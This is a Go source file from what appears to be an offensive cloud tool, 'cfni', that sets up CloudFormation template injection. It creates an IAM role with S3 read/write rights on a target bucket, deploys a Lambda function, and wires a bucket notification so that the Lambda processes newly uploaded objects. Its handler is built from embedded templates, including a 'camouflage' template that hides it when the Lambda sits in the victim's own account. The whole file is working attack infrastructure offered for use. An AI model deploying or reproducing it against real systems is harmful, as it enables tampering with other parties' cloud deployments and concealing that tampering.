package cfni

import (
	"embed"
	"fmt"
	"log"
	"time"

	"github.com/hupe1980/cfni/pkg/config"
	"github.com/hupe1980/cfni/pkg/function"
	"github.com/hupe1980/cfni/pkg/iam"
	"github.com/hupe1980/cfni/pkg/notification"
	"github.com/hupe1980/golog"
)

//go:embed templates
var templates embed.FS

const (
	DefaultFunctionName          = "cfni_function"
	DefaultPermissionStatementID = "cfni_permission"
	DefaultExecutionRoleName     = "cfni_role"
	DefaultPolicyName            = "cfni_policy"
	DefaultNotificationID        = "cfni_notifications"
)

type Options struct {
	FunctionName          string
	PermissionStatementID string
	ExecutionRoleName     string
	PolicyName            string
	NotificationID        string

	// Logger specifies an optional logger.
	// If nil, logging is done via the log package's standard logger.
	Logger golog.Logger
}

type CFNI struct {
	*logger
	attackerAccount    string
	bucketAccount      string
	functionClient     *function.Client
	iamClient          *iam.Client
	notificationClient *notification.Client
	opts               Options
}

func New(attackerConfig *config.Config, bucketConfig *config.Config, optFns ...func(o *Options)) *CFNI {
	opts := Options{
		FunctionName:          DefaultFunctionName,
		PermissionStatementID: DefaultPermissionStatementID,
		ExecutionRoleName:     DefaultExecutionRoleName,
		PolicyName:            DefaultPolicyName,
		NotificationID:        DefaultNotificationID,
		Logger:                golog.NewGoLogger(golog.INFO, log.Default()),
	}

	for _, fn := range optFns {
		fn(&opts)
	}

	return &CFNI{
		logger:             &logger{opts.Logger},
		attackerAccount:    attackerConfig.Account,
		bucketAccount:      bucketConfig.Account,
		functionClient:     function.New(attackerConfig),
		iamClient:          iam.New(attackerConfig),
		notificationClient: notification.New(bucketConfig),
		opts:               opts,
	}
}

func (c *CFNI) CreateInfrastructure(bucket string, handler []byte, roleARN string, attachPolicy bool) error {
	if roleARN == "" {
		var err error

		roleARN, err = c.iamClient.CreateExecutionRole(c.opts.ExecutionRoleName)
		if err != nil {
			return err
		}

		c.logInfof("Execution Role created: %s\n", c.opts.ExecutionRoleName)

		if attachPolicy {
			if err := c.iamClient.AttachRolePolicy(c.opts.ExecutionRoleName, c.opts.PolicyName, &iam.PolicyDocument{
				Version: "2012-10-17",
				Statement: []iam.PolicyStatement{
					{
						Effect:   "Allow",
						Action:   []string{"s3:GetObject", "s3:PutObject"},
						Resource: []string{fmt.Sprintf("arn:aws:s3:::%s/*", bucket)},
					},
				},
			}); err != nil {
				return err
			}

			c.logInfof("Policy attached: %s\n", c.opts.PolicyName)
		}

		// wait 15 seconds to ensure all operations are completed
		time.Sleep(15 * time.Second)
	}

	functionARN, err := c.functionClient.CreateLambdaFunction(c.opts.FunctionName, handler, roleARN)
	if err != nil {
		return err
	}

	c.logInfof("Lambda Function created: %s\n", functionARN)

	if err := c.functionClient.AddS3Permission(c.opts.PermissionStatementID, functionARN, bucket, c.bucketAccount); err != nil {
		return err
	}

	c.logInfof("Permission added: %s\n", c.opts.PermissionStatementID)

	if err := c.notificationClient.CreateBucketNotification(c.opts.NotificationID, bucket, functionARN); err != nil {
		return err
	}

	c.logInfof("Bucket Notification for Bucket %s created: %s\n", bucket, c.opts.NotificationID)

	return nil
}

type Filter struct {
	Environments []string
	StackNames   []string
}

type HandlerOptions struct {
	CFNITemplate string
	CFNIData     any
	S3Client     string
	*Filter
}

func (c *CFNI) createHandler(opts *HandlerOptions) ([]byte, error) {
	camouflage, err := c.createCamouflage()
	if err != nil {
		return nil, err
	}

	model, err := executeTemplate("templates/model.py", nil)
	if err != nil {
		return nil, err
	}

	cfni, err := executeTemplate(opts.CFNITemplate, opts.CFNIData)
	if err != nil {
		return nil, err
	}

	buf, err := executeTemplate("templates/handler.py", &struct {
		Camouflage string
		Model      string
		CFNI       string
		S3Client   string
	}{
		Camouflage: camouflage,
		Model:      model.String(),
		CFNI:       cfni.String(),
		S3Client:   opts.S3Client,
	})
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func (c *CFNI) createCamouflage() (string, error) {
	// Camouflage is only required when the lambda is deployed in the same account as the bucket
	if c.isCrossAccount() {
		return "", nil
	}

	camou, err := executeTemplate("templates/camouflage.py", nil)
	if err != nil {
		return "", err
	}

	return camou.String(), nil
}

func (c *CFNI) createModel() (string, error) {
	model, err := executeTemplate("templates/model.py", nil)
	if err != nil {
		return "", err
	}

	return model.String(), nil
}

func (c *CFNI) isCrossAccount() bool {
	return c.attackerAccount != c.bucketAccount
}
